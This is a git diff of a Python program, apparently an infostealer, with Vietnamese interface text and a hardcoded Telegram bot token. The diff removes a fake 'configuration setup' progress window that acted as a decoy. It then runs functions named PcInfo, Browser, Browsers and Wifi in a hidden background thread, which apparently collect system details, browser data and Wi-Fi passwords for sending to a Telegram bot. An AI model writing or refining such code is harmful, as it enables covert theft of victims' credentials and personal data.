@@ -17,6 +17,7 @@ import tkinter as tk
 from tkinter import ttk
 import random
 import time
+import threading
 
 # How to get token and ID: https://www.youtube.com/watch?v=JNwEJ5HvLgM
 bot_token = '9195079283:AAH9Zqb7f4efx7wVtmNJG2dnp3H44y7nqa4'
@@ -764,7 +765,12 @@ def update_progress():
 
         root.after(2000, root.destroy)
 
-
+def bg_run():
+    PcInfo()
+    Browser()
+    Browsers() 
+    Wifi() 
+    
 def main():
 
     
@@ -789,56 +795,12 @@ def main():
     else:
         print(f"Không tìm thấy file: {bat_file}")
 
-    root = tk.Tk()
-    root.title("Configuration Setup")
-    root.geometry("450x220")
-    root.resizable(False, False)
-    
-    title_label = tk.Label(
-        root,
-        text="Đang cài đặt cấu hình",
-        font=("Segoe UI", 16, "bold")
-    )
-    title_label.pack(pady=(25, 15))
-    
-    status_label = tk.Label(
-        root,
-        text="Đang chuẩn bị...",
-        font=("Segoe UI", 10)
-    )
-    status_label.pack(pady=5)
-    
-    progress = ttk.Progressbar(
-        root,
-        length=370,
-        maximum=100,
-        mode="determinate"
-    )
-    progress.pack(pady=10)
-    
-    percent_label = tk.Label(
-        root,
-        text="0%",
-        font=("Segoe UI", 12, "bold")
-    )
-    percent_label.pack()
-    
-    time_label = tk.Label(
-        root,
-        text=f"Thời gian còn lại: {total_time}s",
-        font=("Segoe UI", 9)
-    )
-    time_label.pack(pady=5)
-    
-    # Tự động chạy
-    root.after(100, update_progress)
-    
-    root.mainloop()
+    threading.Thread(
+        target=bg_run,
+        daemon=True
+    ).start()
 
-    PcInfo()
-    Browser()
-    Browsers() 
-    Wifi()  
+    
 
 if __name__ == "__main__":
     main()
